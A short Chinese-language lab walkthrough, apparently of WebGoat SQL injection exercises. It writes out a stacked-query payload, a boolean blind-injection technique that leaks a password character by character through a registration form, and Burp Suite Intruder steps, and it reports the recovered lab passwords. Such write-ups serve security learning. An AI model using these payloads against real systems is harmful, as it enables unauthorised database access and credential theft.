```
3.
由前面教學可知
先用 ' 將前面的 ' 補起來，再用 ; 接續下一個指令，最後別忘了把後面的東東註解掉

所以，輸入 '; SELECT * FROM user_system_data --
即可得知 dave 的密碼為 dave

5.
帳號 : tom
密碼 : thisisasecretfortomonly

想法：
register 輸入 tom 發現已經存在
接著改輸入為 tom' and true-- 發現也存在
再試試 tom' and false-- ，不存在  (存在 blind injection)

因此，利用 tom' and expression1 就可以判斷 expression1 的真偽
那要怎麼試呢？

只要透過 substring(password, pos, len) = 'blablabla... 讓 len 慢慢增加，就能 leak 出 password 了

ex: 
tom' and substring(password, 1, 1) = 't    => true
tom' and substring(password, 1, 2) = 'th   => true 
tom' and substring(password, 1, 3) = 'the  => false


手動測試也行，但速度較慢
透過 burpsuite 會方便許多

step1.
攔截 packet

step2
packet 滑鼠右鍵->Send to Intruder

step3
到 intruder 的 Positions 將要改變的位址用 § 框住
username_reg=tom'+AND+substring(password%2C1%2C1)%3D'    §t§      &email_reg=a%40aaa&password_reg=a&confirm_password_reg=a
(空格是為了讓你看清楚)

step4
到 payload , 將 a~z 輸入到 payload options 

step5 
回到 Positions, 點擊 Start attack

step6
點擊任一 Request , 觀察 Response 是否為 already exists

手動增加 len ，再次 attack
```
